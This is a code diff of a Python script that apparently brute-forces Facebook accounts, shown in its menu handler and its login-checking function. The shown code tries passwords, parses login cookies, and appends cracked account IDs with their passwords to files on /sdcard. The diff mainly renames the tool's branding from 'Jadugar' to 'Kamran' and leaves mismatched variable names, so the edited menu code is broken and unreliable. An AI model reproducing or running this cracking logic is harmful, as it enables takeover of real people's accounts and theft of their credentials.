@@ -163,10 +163,10 @@ def xyz():
     print(f"[00] {WHITE}EXIT PROGRAM ")
     print(f"")
     print(f"\033[1;91m========================================================")
-    Kashif = input("[âˆš] CHOOSE : ")
+    Kamran = input("[âˆš] CHOOSE : ")
     if Kashif in ["1","01"]:
         Random()
-    elif Kashif in ["0","00"]:
+    elif Kamarn in ["0","00"]:
        exit()
     else:
         print('\033[1;31mINCORECT OPTION!\033[1;31m')
@@ -267,7 +267,7 @@ def free(uid,pwx,tl):
                 cid=coki[24:39]
                 Red = '\033[1;31m'
                 print(f'\r{Red}[Ã—]--------------------[JADU-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')
-                open('/sdcard/Jadugar-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/Kamran-CP.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             elif '/x/checkpoint' in log_cookies:
@@ -275,12 +275,12 @@ def free(uid,pwx,tl):
                 cid=coki[7:22]
                 Red = '\033[1;31m'
                 print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
-                open('/sdcard/Jadugar-2F.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/Kamran-2F.txt', 'a').write(cid+' | '+ps+'\n')
                 twf.append(cid)
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[JADUGAR] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
+        sys.stdout.write(f'\r\33[1;37m[Kamran] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
         sys.stdout.flush()
         checks(oks,cps,twf)
     except:
